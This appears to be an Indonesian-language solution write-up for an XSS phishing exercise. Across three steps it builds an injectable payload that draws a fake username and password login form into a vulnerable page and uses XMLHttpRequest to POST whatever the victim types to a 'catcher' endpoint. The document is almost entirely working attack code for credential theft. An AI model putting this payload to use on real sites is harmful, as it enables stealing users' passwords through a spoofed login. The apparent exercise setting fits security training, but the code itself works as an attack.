# Solusi : XSS Phising #

## Tahap 1 : Menampilkan Form Palsu ##
```html
<br>Username : <input id=username><br>Password : <input type=password id=password><br><button type=button onclick="alert('user:'+document.getElementById('username').value + 'pass : '+document.getElementById('password').value);">Login</button>
```

## Tahap 2 : Script untuk submit form ##

```js
var http = new XMLHttpRequest();
var params = "PROPERTY=yes&username="+document.getElementById('username').value + "&password="+document.getElementById('password').value;
http.open("POST", "catcher", true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.send(params);
```

## Tahap 3 : Gabungkan ##

```html
<script>function kirim(){var http = new XMLHttpRequest();var params = "PROPERTY=yes&username="+document.getElementById("username").value + "&password="+document.getElementById("password").value;http.open("POST", "catcher", true);http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.send(params);}</script>
<br>Username : <input id=username><br>Password : <input type=password id=password><br><button type='button' onclick='kirim()'>Login</button>
```
